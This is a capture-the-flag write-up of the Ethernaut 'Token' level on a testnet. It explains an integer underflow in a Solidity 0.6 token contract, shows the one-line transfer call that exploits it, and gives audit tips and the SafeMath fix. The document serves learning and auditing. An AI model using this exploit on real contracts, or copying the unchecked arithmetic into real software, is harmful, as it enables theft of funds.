// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }}

    # Ethernaut — Level 5: Token

**Network:** Sepolia testnet  
**Contract:** `0x0812b275351d66D59dE75E7B8f3cDCF101ab3237`  
**Date completed:** June 2026

---

## What the challenge was

Start with 20 tokens and end up with more — ideally a very large number.  
The contract is a simple token system with no overflow protection.

---

## What confused me

- The result of `balanceOf()` came back as a big object — had to use `.toString()` to read the actual number
- The zero address `0x000...0000` rejected the transfer — used `0x111...1111` instead as the recipient

---

## Vulnerability involved

**Integer underflow (Solidity <0.8.0).**

The full contract source:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

Two bugs in the `transfer` function:

**Bug 1 — The require check is useless**  
`balances[msg.sender] - _value` is a `uint256` — it can never be negative in Solidity.  
So `>= 0` is always true, even when spending more than you have. The check never blocks anything.

**Bug 2 — Underflow on subtraction**  
In Solidity `^0.6.0`, there is no built-in overflow/underflow protection.  
Subtracting more than the balance wraps around to the maximum `uint256` value:

```
20 - 21 = -1        ← expected
20 - 21 = 115792089237316195423570985008687907853269984665640564039457584007913129639935
         ← what uint256 actually does (2^256 - 1)
```

---

## How I solved it

**Step 1 — Transfer more tokens than I had**
```javascript
await contract.transfer('0x1111111111111111111111111111111111111111', 21)
```
I had 20 tokens and sent 21 — triggering the underflow.

**Step 2 — Verified the balance**
```javascript
(await contract.balanceOf(player)).toString()
// returned: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
```

**Step 3 — Submitted the instance** ✅

---

## How to find this in real contracts

**Check the Solidity version first:**
```solidity
pragma solidity ^0.6.0;  // ❌ no built-in overflow protection
pragma solidity ^0.8.0;  // ✅ overflow reverts automatically
```

**Search for unsafe arithmetic:**
```bash
grep -r "-=" ./contracts/
grep -r "+=" ./contracts/
grep -r "balances\[" ./contracts/
```

**On Etherscan:**
1. Open contract → Code tab
2. Check the pragma version
3. `Ctrl+F` for `-=` and `+=` on any `uint` variable
4. Check if `SafeMath` is imported and used

**Using Slither:**
```bash
slither ./contracts/ --detect uint-underflow
```

**What safe code looks like:**

In Solidity `^0.6.0`, the fix was OpenZeppelin SafeMath:
```solidity
using SafeMath for uint256;
balances[msg.sender] = balances[msg.sender].sub(_value);
```

In Solidity `^0.8.0`, overflow/underflow reverts automatically — no library needed.

---

## Real world impact

This exact class of bug was used in the **BEC token hack in 2018**.  
Attackers minted `2^255` tokens out of thin air by triggering an overflow, then dumped them — wiping out over $900 million in market cap in a single transaction.

---

## Key takeaway

Always check the Solidity version when auditing. Any contract on `^0.6.0` or below that does arithmetic on `uint` without SafeMath is potentially vulnerable to overflow/underflow.

In `^0.8.0+` this is handled automatically — but if you see `unchecked {}` blocks, the protection is deliberately turned off and those sections need careful review.
